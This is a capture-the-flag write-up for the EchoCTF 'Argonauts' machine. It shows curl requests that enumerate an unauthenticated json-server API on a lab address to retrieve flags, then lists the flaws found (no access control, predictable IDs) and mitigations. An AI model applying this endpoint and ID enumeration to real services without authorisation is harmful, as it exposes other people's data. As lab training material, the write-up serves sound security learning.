
![jason1](https://raw.githubusercontent.com/Juno0w0/echoCTF_Writeups/refs/heads/main/Writeups/argonauts/jason1.png)
# Argonauts - CTF Writeup

**IP:** http://10.0.41.12:1337

---

## Introduction

The **Argonauts** machine from **EchoCTF** presents a challenge based on exploring a JSON API. The goal is to discover hidden flags by accessing different endpoints revealing information about vehicles, owners, and vehicle types. The machine runs on a JSON Server backend exposing data via RESTful endpoints.

---

## How json-server works

**json-server** is a tool that quickly creates a RESTful API from a JSON file, allowing CRUD operations over resources like `plates`, `owners`, and `types`. Each resource has a standard endpoint, and data can be retrieved or modified via HTTP calls.

---

## Reconnaissance and Exploration

Accessing `http://10.0.41.12:1337` shows documentation indicating:

![jason2](https://raw.githubusercontent.com/Juno0w0/echoCTF_Writeups/refs/heads/main/Writeups/argonauts/jason2.png)

- Initial endpoint: `/DMV`
- Hidden endpoint for the flag: `/??????`

A quick review of [json-server documentation](https://github.com/typicode/json-server) helps understand its operation. The first query can be done via `curl` or directly through the browser URL; for practical reasons, we use `curl` here:

```bash
curl http://10.0.41.12:1337/DMV
```

Response:

```json
[
  {
    "id": 1,
    "plate_id": 1,
    "owner_id": 2,
    "type_id": 1
  },
  {
    "id": 2,
    "plate_id": 4,
    "owner_id": 2,
    "type_id": 1
  }
]
```

---

## Detailed Exploration

### `/plate/1`

```bash
curl http://10.0.41.12:1337/plate/1
```

Response:

```json
{
  "id": 1,
  "number": "6535 XYZ",
  "type_id": 1
}
```

### `/plate`

```bash
curl http://10.0.41.12:1337/plate
```

Response (snippet):

```json
[
  {"id":1,"number":"6535 XYZ","type_id":1},
  {"id":2,"number":"3735 QWE","type_id":2},
  {"id":3,"number":"ETSCTF_JUNO_WAS_HERE_HEHEHE","type_id":2},
  {"id":4,"number":"4890 LKJ","type_id":1},
  {"id":5,"number":"2193 JGH","type_id":2}
]
```

---

### `/owner`

```bash
curl http://10.0.41.12:1337/owner
```

Response:

```json
[
  {"id":2,"name":"Name Surname other"},
  {"id":3,"name":"ETSCTF_JUNO_WAS_HERE_HEHEHE"}
]
```

---

### `/type`

```bash
curl http://10.0.41.12:1337/type
```

Response:

```json
[
  {"id":1,"name":"VAN"},
  {"id":3,"name":"CAR"}
]
```

---

## Last flag found

Querying the hidden endpoint suggested in the documentation:

```bash
curl http://10.0.41.12:1337/ETSCTF
```

Response:

```json
{
  "value": "ETSCTF_JUNO_WAS_HERE_HEHEHE"
}
```

---

## Security Risks

- Total exposure of sensitive data without authentication.
- Lack of access control and validation.
- Implicit IDOR due to use of sequential IDs.
- Unprotected hidden endpoint.

---

## Vulnerabilities

- Lack of authentication and authorization.
- Exposure of flags through public endpoints.
- Lack of permission validation in the API.

---

## Mitigation Measures

- Implement authentication and authorization in the API.
- Use non-predictable identifiers (UUIDs).
- Restrict HTTP methods in production.
- Monitor accesses and suspicious activities.
- Avoid exposing sensitive data in public environments.

---

## Teaching Conclusion

This challenge exemplifies how a json-server without security measures can easily expose confidential data. It is crucial to apply access controls, validate permissions, and avoid unnecessary exposures in RESTful APIs.

---

**-Writeup by SheepsStealer-**
